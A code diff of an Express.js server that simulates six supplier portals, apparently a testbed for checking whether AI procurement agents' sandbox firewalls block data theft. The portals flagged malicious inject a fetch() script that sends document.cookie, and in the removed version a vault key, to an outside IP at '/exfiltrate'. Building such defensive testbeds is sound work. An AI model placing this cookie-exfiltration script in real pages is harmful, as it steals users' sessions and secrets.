@@ -1,448 +1,158 @@
-/**
- * Mock Supplier Portals for AI Agent Hackathon Demo
- * --------------------------------------------------
- * Simulates 5 supplier portals:
- *  - Portals 1, 2, 3: Safe portals (Login -> Dashboard -> Download Invoice)
- *  - Portals 4, 5: Compromised portals (Visually identical, but triggers client-side
- *                  fetch() exfiltration to 185.23.50.50:80 to test iptables drop rules)
- *
- * Zero external CSS/JS dependencies. Pure Express single-file server.
- */
-
 const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware for parsing form submissions and JSON
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
 
-// 5 Supplier Configurations
-const PORTALS = {
-  portal1: { id: 'portal1', name: 'Apex Industrial Components', safe: true, code: 'AIC-01' },
-  portal2: { id: 'portal2', name: 'Nexus Precision Logistics', safe: true, code: 'NPL-02' },
-  portal3: { id: 'portal3', name: 'Vanguard Raw Materials Co.', safe: true, code: 'VRM-03' },
-  portal4: { id: 'portal4', name: 'Titan Semiconductor Dist.', safe: false, code: 'TSD-04' },
-  portal5: { id: 'portal5', name: 'Zenith Global Avionics', safe: false, code: 'ZGA-05' }
-};
-
-// Brutalist Shared Stylesheet (Inline, zero external calls)
-const BASE_CSS = `
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-    background: #0e0f12;
-    color: #e4e7eb;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    padding: 24px;
-  }
-  .card {
-    background: #181a20;
-    border: 2px solid #2d3139;
-    box-shadow: 6px 6px 0px #000;
-    width: 100%;
-    max-width: 520px;
-    padding: 32px;
-  }
-  .header {
-    border-bottom: 2px solid #2d3139;
-    padding-bottom: 16px;
-    margin-bottom: 24px;
-  }
-  .header h1 {
-    font-size: 1.15rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    color: #fff;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-  }
-  .badge {
-    font-size: 0.72rem;
-    padding: 3px 8px;
-    background: #252932;
-    border: 1px solid #3e4451;
-    color: #9aa5b5;
-    text-transform: uppercase;
-  }
-  .form-group {
-    margin-bottom: 18px;
-  }
-  label {
-    display: block;
-    font-size: 0.8rem;
-    color: #9aa5b5;
-    margin-bottom: 6px;
-    text-transform: uppercase;
-    font-weight: 600;
-  }
-  input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 10px 14px;
-    background: #0e0f12;
-    border: 1px solid #3e4451;
-    color: #fff;
-    font-family: inherit;
-    font-size: 0.95rem;
-    outline: none;
-  }
-  input[type="text"]:focus, input[type="password"]:focus {
-    border-color: #5b68df;
-  }
-  .btn {
-    display: inline-block;
-    width: 100%;
-    padding: 12px;
-    background: #e4e7eb;
-    color: #0e0f12;
-    border: 2px solid #fff;
-    font-family: inherit;
-    font-size: 0.9rem;
-    font-weight: 700;
-    text-align: center;
-    text-decoration: none;
-    text-transform: uppercase;
-    cursor: pointer;
-    box-shadow: 4px 4px 0px #000;
-    transition: transform 0.05s ease;
-  }
-  .btn:hover {
-    background: #fff;
-  }
-  .btn:active {
-    transform: translate(2px, 2px);
-    box-shadow: 2px 2px 0px #000;
-  }
-  .btn-accent {
-    background: #3b82f6;
-    color: #fff;
-    border-color: #60a5fa;
-  }
-  .btn-accent:hover {
-    background: #2563eb;
-  }
-  .meta-row {
-    display: flex;
-    justify-content: space-between;
-    padding: 8px 0;
-    border-bottom: 1px dashed #2d3139;
-    font-size: 0.82rem;
-  }
-  .meta-key { color: #9aa5b5; }
-  .meta-val { color: #fff; font-weight: 600; }
-  .note {
-    margin-top: 20px;
-    font-size: 0.72rem;
-    color: #6c7689;
-    line-height: 1.4;
-  }
-`;
-
-// Helper: Generate Login Page HTML
-function renderLoginPage(portal) {
-  return `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>${portal.name} - Vendor Authentication</title>
-  <style>${BASE_CSS}</style>
-</head>
-<body>
-  <div class="card">
-    <div class="header">
-      <h1>
-        <span>${portal.name}</span>
-        <span class="badge">${portal.code}</span>
-      </h1>
-    </div>
-    <form action="/${portal.id}/login" method="POST">
-      <div class="form-group">
-        <label for="username">Authorized Agent ID / Username</label>
-        <input type="text" id="username" name="username" placeholder="agent-playwright-worker" required autocomplete="username">
-      </div>
-      <div class="form-group">
-        <label for="password">Session Access Key / Password</label>
-        <input type="password" id="password" name="password" placeholder="••••••••••••" required autocomplete="current-password">
-      </div>
-      <button type="submit" class="btn">Authenticate & Access Dashboard</button>
-    </form>
-    <div class="note">
-      SECURE PROTOCOL • ACCEPTING ANY DEMO CREDENTIALS • DISPOSABLE PLAYWRIGHT TESTBED
-    </div>
-  </div>
-</body>
-</html>`;
-}
-
-// Helper: Generate Dashboard Page HTML
-function renderDashboardPage(portal) {
-  // If malicious, inject client-side exfiltration script targeted at external mock attacker IP
-  const maliciousScript = portal.safe ? '' : `
-  <script>
-    (function() {
-      // -----------------------------------------------------------------------
-      // MALICIOUS SIMULATED PAYLOAD (Portal 4 / 5)
-      // Executes immediately on page load to exfiltrate cookies/DOM secrets.
-      // Expected Behavior in Zero-Trust Sandbox:
-      // Docker iptables egress firewall MUST DROP this packet before it leaves host.
-      // -----------------------------------------------------------------------
-      const exfilEndpoint = "http://185.23.50.50:80/exfiltrate";
-      const stolenData = {
-        originPortal: "${portal.id}",
-        supplierName: "${portal.name}",
-        cookies: document.cookie,
-        accountSecret: document.getElementById('vault-key')?.innerText || "SK_PROD_SUPPLIER_09918",
-        url: window.location.href,
-        timestamp: new Date().toISOString()
-      };
-
-      try {
-        fetch(exfilEndpoint, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(stolenData)
-        }).then(function() {
-          console.warn("[SECURITY_TEST] Exfiltration request sent to " + exfilEndpoint);
-        }).catch(function(err) {
-          console.info("[ZERO_TRUST_DEFENSE] Exfiltration connection blocked:", err.message);
-        });
-      } catch (e) {
-        console.info("[ZERO_TRUST_DEFENSE] Trapped fetch error:", e);
-      }
-    })();
-  </script>`;
-
-  return `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>${portal.name} - Vendor Dashboard</title>
-  <style>${BASE_CSS}</style>
-</head>
-<body>
-  <div class="card">
-    <div class="header">
-      <h1>
-        <span>${portal.name}</span>
-        <span class="badge">${portal.code}</span>
-      </h1>
-    </div>
-
-    <div style="margin-bottom: 24px;">
-      <div class="meta-row">
-        <span class="meta-key">SUPPLIER STATUS</span>
-        <span class="meta-val" style="color: #4ade80;">ACTIVE • VERIFIED</span>
-      </div>
-      <div class="meta-row">
-        <span class="meta-key">BILLING CYCLE</span>
-        <span class="meta-val">OCTOBER 2026 (FINAL)</span>
-      </div>
-      <div class="meta-row">
-        <span class="meta-key">OUTSTANDING AMOUNT</span>
-        <span class="meta-val">$18,450.00 USD</span>
-      </div>
-      <div class="meta-row">
-        <span class="meta-key">API VAULT KEY</span>
-        <span class="meta-val" id="vault-key">SK_LIVE_${portal.code}_9948271</span>
-      </div>
-    </div>
-
-    <div style="margin-bottom: 12px;">
-      <a href="/${portal.id}/invoice" class="btn btn-accent" download>
-        Download October Invoice
-      </a>
-    </div>
-
-    <div>
-      <a href="/${portal.id}/login" class="btn" style="background: transparent; color: #9aa5b5; border-color: #2d3139; font-size: 0.78rem; padding: 8px;">
-        Disconnect Session
-      </a>
-    </div>
-
-    <div class="note">
-      INVOICE ARCHIVE GENERATED DETERMINISTICALLY • AUTOMATED RETRIEVAL ENDPOINT READY
-    </div>
-  </div>
-
-  ${maliciousScript}
-</body>
-</html>`;
-}
-
-// Register routes dynamically for all 5 portals
-Object.values(PORTALS).forEach(portal => {
-  const pPath = `/${portal.id}`;
-
-  // Default redirect to login
-  app.get(pPath, (req, res) => {
-    res.redirect(`${pPath}/login`);
-  });
-
-  // GET: Login Page
-  app.get(`${pPath}/login`, (req, res) => {
-    res.send(renderLoginPage(portal));
-  });
-
-  // POST: Login Submission (Accept any credentials)
-  app.post(`${pPath}/login`, (req, res) => {
-    const { username } = req.body;
-    const sessionToken = `sess_${portal.id}_${Date.now()}_agent_${Buffer.from(username || 'anonymous').toString('hex').slice(0, 8)}`;
-    
-    // Set mock authentication cookies
-    res.setHeader('Set-Cookie', [
-      `session_token=${sessionToken}; Path=/; HttpOnly=false; SameSite=Lax`,
-      `supplier_id=${portal.code}; Path=/; HttpOnly=false; SameSite=Lax`
-    ]);
-
-    res.redirect(`${pPath}/dashboard`);
-  });
-
-  // GET: Dashboard Page (Visually identical across all 5; 4 and 5 include hidden exfil payload)
-  app.get(`${pPath}/dashboard`, (req, res) => {
-    res.send(renderDashboardPage(portal));
-  });
-
-  // GET: Download October Invoice (Dummy plain text file)
-  app.get(`${pPath}/invoice`, (req, res) => {
-    const invoiceContent = [
-      `============================================================`,
-      `                  OFFICIAL SUPPLIER INVOICE                 `,
-      `============================================================`,
-      `Supplier:      ${portal.name} (${portal.code})`,
-      `Invoice No:    INV-OCT2026-${portal.code}-0091`,
-      `Issue Date:    2026-10-31`,
-      `Due Date:      2026-11-15`,
-      `Status:        PAYMENT PENDING`,
-      `------------------------------------------------------------`,
-      `ITEM DESCRIPTION                          QTY     AMOUNT    `,
-      `------------------------------------------------------------`,
-      `Industrial Hardware Component Kit - Rev4   100     $12,500.00`,
-      `Expedited Secure Freight & Customs         1       $ 3,950.00`,
-      `Quality Assurance & Compliance Cert        1       $ 2,000.00`,
-      `------------------------------------------------------------`,
-      `TOTAL DUE:                                         $18,450.00`,
-      `Wire Routing:  US98 0001 2349 8812 0041`,
-      `============================================================`,
-      `Verified by Automated Procurement Sandbox`,
-      ``
-    ].join('\n');
-
-    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-    res.setHeader('Content-Disposition', `attachment; filename="invoice_october_${portal.id}.txt"`);
-    res.send(invoiceContent);
-  });
+// Live Terminal Request Logger
+app.use((req, res, next) => {
+  const t = new Date().toLocaleTimeString('en-US', { hour12: false });
+  console.log(`[${t}] ${req.method.padEnd(4)} ${req.url}`);
+  next();
 });
 
-// Root Index Page: Demonstration Command Center
+// Portal Definitions
+const portals = [
+  { id: 'portal1', name: 'Tiny Fox Press',          code: 'TFP-01', safe: true,  ext: 'txt',  mime: 'text/plain' },
+  { id: 'portal2', name: 'Featherproof Books',      code: 'FPB-02', safe: true,  ext: 'txt',  mime: 'text/plain' },
+  { id: 'portal3', name: 'Melville House',           code: 'MVH-03', safe: true,  ext: 'csv',  mime: 'text/csv' },
+  { id: 'portal4', name: 'Dalkey Archive Press',     code: 'DAP-04', safe: false, ext: 'csv',  mime: 'text/csv' },
+  { id: 'portal5', name: 'Smith, Elder & Co',        code: 'SEC-05', safe: false, ext: 'html', mime: 'text/html' },
+  { id: 'portal6', name: 'Chronicle Books',          code: 'CHB-06', safe: true,  ext: 'pdf',  mime: 'application/pdf' },
+];
+
+const EXFIL_URL = 'http://185.23.50.50:80/exfiltrate';
+
+function generateInvoice(portal) {
+  const date = new Date().toISOString().split('T')[0];
+  const inv = `INV-${portal.code}-${Date.now()}`;
+  const total = (Math.random() * 50000 + 5000).toFixed(2);
+  if (portal.ext === 'txt') {
+    return `INVOICE\n======\nInvoice #: ${inv}\nSupplier: ${portal.name}\nCode: ${portal.code}\nDate: ${date}\nTotal: $${total}\nStatus: PAID\n`;
+  }
+  if (portal.ext === 'csv') {
+    return `Invoice,Supplier,Date,Total\n${inv},"${portal.name}",${date},${total}\n`;
+  }
+  if (portal.ext === 'html') {
+    return `<!DOCTYPE html><html><head><title>Invoice</title></head><body style="font-family:monospace;padding:40px"><h1>INVOICE</h1><hr><p><b>Invoice #:</b> ${inv}</p><p><b>Supplier:</b> ${portal.name}</p><p><b>Code:</b> ${portal.code}</p><p><b>Date:</b> ${date}</p><p><b>Total:</b> $${total}</p><p><b>Status:</b> PAID</p></body></html>`;
+  }
+  if (portal.ext === 'pdf') {
+    const content = `BT /F1 14 Tf 50 750 Td (INVOICE) Tj ET BT /F1 10 Tf 50 720 Td (Invoice #: ${inv}) Tj ET BT /F1 10 Tf 50 700 Td (Supplier: ${portal.name}) Tj ET BT /F1 10 Tf 50 680 Td (Code: ${portal.code}) Tj ET BT /F1 10 Tf 50 660 Td (Date: ${date}) Tj ET BT /F1 10 Tf 50 640 Td (Total: $${total}) Tj ET BT /F1 10 Tf 50 620 Td (Status: PAID) Tj ET`;
+    const objs = [
+      `1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj`,
+      `2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj`,
+      `3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj`,
+      `4 0 obj<</Length ${content.length}>>stream\n${content}\nendstream endobj`,
+      `5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj`,
+    ];
+    let pdf = '%PDF-1.4\n';
+    const offsets = [];
+    objs.forEach(o => { offsets.push(pdf.length); pdf += o + '\n'; });
+    const xrefPos = pdf.length;
+    pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
+    offsets.forEach(o => { pdf += String(o).padStart(10, '0') + ' 00000 n \n'; });
+    pdf += `trailer<</Size ${objs.length + 1}/Root 1 0 R>>\nstartxref\n${xrefPos}\n%%EOF`;
+    return Buffer.from(pdf, 'binary');
+  }
+  return '';
+}
+
+function exfilScript(portal) {
+  return `<script>
+fetch('${EXFIL_URL}?portal=${portal.id}&code=${portal.code}&cookie='+encodeURIComponent(document.cookie));
+</script>`;
+}
+
+function layout(title, body, portal) {
+  const exfil = portal && !portal.safe ? exfilScript(portal) : '';
+  return `<!DOCTYPE html><html><head><meta charset="utf-8"><title>${title}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Courier New',monospace;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
+.nav{background:#111;border-bottom:3px solid #333;padding:16px 32px;display:flex;justify-content:space-between;align-items:center}
+.nav a{color:#0f0;text-decoration:none;font-weight:bold}
+.card{background:#111;border:3px solid #333;padding:32px;margin:32px;max-width:700px}
+.card h1{font-size:1.4em;margin-bottom:8px;color:#fff}
+.card h2{font-size:1.1em;margin-bottom:16px;color:#aaa}
+.badge{display:inline-block;padding:4px 12px;font-size:.8em;font-weight:bold;margin:4px 4px 4px 0}
+.safe{background:#0a3d0a;color:#0f0;border:1px solid #0f0}
+.mal{background:#3d0a0a;color:#f00;border:1px solid #f00}
+.fmt{background:#0a0a3d;color:#00f;border:1px solid #00f}
+.btn{display:inline-block;background:#0f0;color:#000;padding:12px 24px;text-decoration:none;font-weight:bold;border:none;cursor:pointer;font-family:inherit;font-size:1em;margin-top:16px}
+.btn:hover{background:#0c0}
+.btn2{background:#333;color:#fff}
+.btn2:hover{background:#555}
+input[type=text],input[type=password]{background:#1a1a1a;border:2px solid #333;color:#fff;padding:10px;font-family:inherit;width:100%;margin:8px 0 16px}
+label{color:#aaa;font-size:.9em}
+table{width:100%;border-collapse:collapse;margin-top:16px}
+td,th{border:1px solid #333;padding:8px;text-align:left}
+th{background:#1a1a1a;color:#0f0}
+</style></head><body>
+<div class="nav"><a href="/">[ SUPPLIER PORTAL DIRECTORY ]</a><span>${portal ? portal.code : 'SYSTEM'}</span></div>
+${body}${exfil}</body></html>`;
+}
+
+// Root Directory
 app.get('/', (req, res) => {
-  const portalLinks = Object.values(PORTALS).map(p => `
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 14px; background: #181a20; border: 1px solid #2d3139; margin-bottom: 10px;">
-      <div>
-        <div style="font-weight: 700; color: #fff;">${p.name}</div>
-        <div style="font-size: 0.75rem; color: #6c7689;">Route: /${p.id}/login &nbsp;|&nbsp; Code: ${p.code}</div>
-      </div>
-      <div style="display: flex; gap: 8px; align-items: center;">
-        <span style="font-size: 0.72rem; padding: 2px 6px; font-weight: 700; border: 1px solid ${p.safe ? '#22c55e' : '#ef4444'}; color: ${p.safe ? '#4ade80' : '#f87171'}; background: ${p.safe ? '#14532d20' : '#7f1d1d20'};">
-          ${p.safe ? 'SAFE PORTAL' : 'MALICIOUS EXFILTRATION'}
-        </span>
-        <a href="/${p.id}/login" style="padding: 6px 10px; background: #e4e7eb; color: #0e0f12; font-size: 0.75rem; font-weight: 700; text-decoration: none;">Launch</a>
-      </div>
-    </div>
-  `).join('');
-
-  res.send(`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>AI Agent Hackathon Testbed - Mock Supplier Portals</title>
-  <style>${BASE_CSS}</style>
-</head>
-<body style="align-items: center;">
-  <div class="card" style="max-width: 680px;">
-    <div class="header">
-      <h1>
-        <span>Mock Supplier Portal Network</span>
-        <span class="badge">DEMO CLUSTER</span>
-      </h1>
-      <p style="font-size: 0.8rem; color: #9aa5b5; margin-top: 6px;">
-        Zero-Trust Defense Testbed for Headless Playwright AI Procurement Agents
-      </p>
-    </div>
-
-    <div style="margin-bottom: 20px;">
-      ${portalLinks}
-    </div>
-
-    <div style="background: #0e0f12; border: 1px solid #2d3139; padding: 14px; font-size: 0.75rem; line-height: 1.5; color: #9aa5b5;">
-      <strong style="color: #fff;">Hackathon Intercept Architecture:</strong><br>
-      • <span style="color: #4ade80;">Portals 1, 2, 3:</span> Benign supplier portals with standard invoice download.<br>
-      • <span style="color: #f87171;">Portals 4, 5:</span> Visually identical portals injected with background JavaScript attempting to POST stolen session cookies to <code style="color: #e4e7eb;">http://185.23.50.50:80/exfiltrate</code>.<br>
-      • <strong style="color: #fff;">Zero-Trust Confinement:</strong> Under our hardened Docker iptables egress rules, all requests to 185.23.50.50 are dropped silently while local MITM proxy forwarding permits legitimate operations.
-    </div>
-  </div>
-</body>
-</html>`);
+  let rows = portals.map(p => `<tr>
+    <td><a href="/${p.id}/login" style="color:#0f0">${p.name}</a></td>
+    <td>${p.code}</td>
+    <td><span class="badge ${p.safe ? 'safe' : 'mal'}">${p.safe ? 'SAFE' : 'MALICIOUS'}</span></td>
+    <td><span class="badge fmt">.${p.ext}</span></td>
+    <td><a href="/${p.id}/login" class="btn" style="padding:6px 16px;font-size:.85em">LOGIN →</a></td>
+  </tr>`).join('');
+  res.send(layout('Supplier Portal Directory', `
+    <div class="card"><h1>SUPPLIER PORTAL DIRECTORY</h1><h2>6 Portals Online</h2>
+    <table><tr><th>Supplier</th><th>Code</th><th>Status</th><th>Format</th><th>Action</th></tr>${rows}</table>
+    </div>`));
 });
 
-// Start Express Server with Dual-Stack (IPv4 + IPv6 localhost), EADDRINUSE Resilience, and Auto-Launch
-const { exec } = require('child_process');
-
-function startServer(portToUse) {
-  // Binding without '0.0.0.0' enables dual-stack IPv4/IPv6 so both localhost and 127.0.0.1 work seamlessly
-  const srv = app.listen(portToUse, () => {
-    printBanner(portToUse);
-    // Automatically open user's default browser on desktop
-    if (!process.env.NO_OPEN) {
-      const openTarget = `http://localhost:${portToUse}/`;
-      exec(`start "" "${openTarget}"`, (err) => {
-        if (err) {
-          // Fallback to 127.0.0.1 if localhost resolution throws
-          exec(`start "" "http://127.0.0.1:${portToUse}/"`);
-        }
-      });
-    }
+// Per-portal routes
+portals.forEach(portal => {
+  app.get(`/${portal.id}/login`, (req, res) => {
+    res.send(layout(`${portal.name} - Login`, `
+      <div class="card"><h1>${portal.name}</h1><h2>Code: ${portal.code}</h2>
+      <span class="badge ${portal.safe ? 'safe' : 'mal'}">${portal.safe ? 'SAFE' : 'MALICIOUS'}</span>
+      <span class="badge fmt">.${portal.ext}</span>
+      <form method="POST" action="/${portal.id}/login">
+        <label>Username</label><input type="text" name="user" placeholder="supplier_user" required>
+        <label>Password</label><input type="password" name="pass" placeholder="••••••••" required>
+        <button class="btn" type="submit">SIGN IN →</button>
+      </form></div>`, portal));
   });
 
-  srv.on('error', (err) => {
-    if (err.code === 'EADDRINUSE') {
-      const fallbackPort = Number(portToUse) + 1;
-      console.warn(`[!] Port ${portToUse} is currently in use by another process.`);
-      console.log(`[*] Automatically switching to fallback port: ${fallbackPort}...`);
-      startServer(fallbackPort);
-    } else {
-      console.error('[!] Server encountered error:', err.message);
-    }
+  app.post(`/${portal.id}/login`, (req, res) => {
+    res.redirect(`/${portal.id}/dashboard`);
   });
 
-  return srv;
-}
+  app.get(`/${portal.id}/dashboard`, (req, res) => {
+    res.send(layout(`${portal.name} - Dashboard`, `
+      <div class="card"><h1>${portal.name}</h1><h2>Code: ${portal.code}</h2>
+      <span class="badge ${portal.safe ? 'safe' : 'mal'}">${portal.safe ? 'SAFE' : 'MALICIOUS'}</span>
+      <span class="badge fmt">.${portal.ext}</span>
+      <p style="margin-top:16px;color:#aaa">Welcome. Your latest invoice is ready for download.</p>
+      <a href="/${portal.id}/invoice" class="btn">⬇ DOWNLOAD INVOICE (.${portal.ext})</a>
+      <a href="/${portal.id}/login" class="btn btn2" style="margin-left:8px">← LOGOUT</a>
+      </div>`, portal));
+  });
 
-function printBanner(p) {
-  console.log(`\n==================================================================`);
-  console.log(`  🚀 Mock Supplier Portals are LIVE and RUNNING`);
-  console.log(`  👉 Directory Hub:      http://localhost:${p}/`);
-  console.log(`                         http://127.0.0.1:${p}/`);
-  console.log(`==================================================================`);
-  console.log(`  • Portal 1 (Safe):      http://localhost:${p}/portal1/login`);
-  console.log(`  • Portal 2 (Safe):      http://localhost:${p}/portal2/login`);
-  console.log(`  • Portal 3 (Safe):      http://localhost:${p}/portal3/login`);
-  console.log(`  • Portal 4 (Malicious): http://localhost:${p}/portal4/login (Exfil to 185.23.50.50)`);
-  console.log(`  • Portal 5 (Malicious): http://localhost:${p}/portal5/login (Exfil to 185.23.50.50)`);
-  console.log(`------------------------------------------------------------------`);
-  console.log(`  [i] Automatically opening ${httpUrl(p)} in your default browser...`);
-  console.log(`  [i] Keep this terminal window OPEN while testing.`);
-  console.log(`  [i] Press Ctrl + C to stop the server.`);
-  console.log(`==================================================================\n`);
-}
+  app.get(`/${portal.id}/invoice`, (req, res) => {
+    const data = generateInvoice(portal);
+    res.setHeader('Content-Type', portal.mime);
+    res.setHeader('Content-Disposition', `attachment; filename="invoice_${portal.id}.${portal.ext}"`);
+    res.send(data);
+  });
+});
 
-function httpUrl(p) {
-  return `http://localhost:${p}/`;
-}
-
-startServer(PORT);
+// Dual-stack listen
+const server = app.listen(PORT, '::', () => {
+  console.log(`[+] Mock Supplier Portals running on http://localhost:${PORT}`);
+  console.log(`[+] Directory route: http://localhost:${PORT}/`);
+  console.log(`[+] 6 Portals online: portal1 (.txt), portal2 (.txt), portal3 (.csv), portal4 (.csv), portal5 (.html), portal6 (.pdf)`);
+});
+server.on('error', (err) => {
+  if (err.code === 'EADDRINUSE') {
+    console.warn(`[!] Port ${PORT} busy, attempting next port...`);
+    app.listen(Number(PORT) + 1, '::');
+  }
+});
